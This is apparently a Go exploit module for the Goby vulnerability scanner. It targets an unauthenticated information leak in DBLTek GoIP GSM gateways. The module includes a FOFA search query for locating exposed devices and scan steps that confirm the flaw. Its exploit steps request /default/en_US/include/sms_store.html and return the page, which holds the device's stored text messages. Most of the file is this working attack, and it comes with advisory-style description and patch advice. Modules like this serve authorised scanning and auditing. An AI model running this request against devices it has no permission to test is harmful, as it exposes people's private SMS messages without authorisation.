package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dbltek GoIP sms_store sensitive information leaked",
    "Description": "<p>DBL DBLTek devices is a GOIP gateway product of China Deborah (DBL) company.</p><p>There is a security vulnerability in the web server on DBL DBLTek devices, and attackers can obtain sensitive text messages from the system without authorization.</p>",
    "Product": "Dbltek-GoIP",
    "Homepage": "http://www.dbltek.com/",
    "DisclosureDate": "2022-02-20",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "banner=\"/default/en_US/status.html\" || header=\"/default/en_US/status.html\"",
    "GobyQuery": "banner=\"/default/en_US/status.html\" || header=\"/default/en_US/status.html\"",
    "Level": "3",
    "Impact": "<p>There is a security vulnerability in the web server on DBL DBLTek devices, the attacker reads the system SMS message by constructing a special URL address.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage:</p><p><a href=\"http://www.dbltek.com/\">http://www.dbltek.com/</a></p>",
    "References": [
        "https://shufflingbytes.com/posts/hacking-goip-gsm-gateway/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/default/en_US/include/sms_store.html",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "SMS InBox",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sms_store_tab",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/default/en_US/include/sms_store.html",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Dbltek GoIP sms_store 敏感信息泄露",
            "Product": "Dbltek-GoIP",
            "Description": "<p>DBL DBLTek devices是中国得伯乐（DBL）公司的一款GOIP网关产品。</p><p>DBL DBLTek设备上的Web服务器存在安全漏洞，攻击者可以未经授权获取系统敏感短信信息。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：</p><p><a href=\"http://www.dbltek.com/\">http://www.dbltek.com/</a></p>",
            "Impact": "<p>DBL DBLTek设备上的Web服务器存在安全漏洞，攻击者通过构造特殊URL地址，读取系统短信信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Dbltek GoIP sms_store sensitive information leaked",
            "Product": "Dbltek-GoIP",
            "Description": "<p>DBL DBLTek devices is a GOIP gateway product of China Deborah (DBL) company.</p><p>There is a security vulnerability in the web server on DBL DBLTek devices, and attackers can obtain sensitive text messages from the system without authorization.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage:</p><p><a href=\"http://www.dbltek.com/\">http://www.dbltek.com/</a></p>",
            "Impact": "<p>There is a security vulnerability in the web server on DBL DBLTek devices, the attacker reads the system SMS message by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}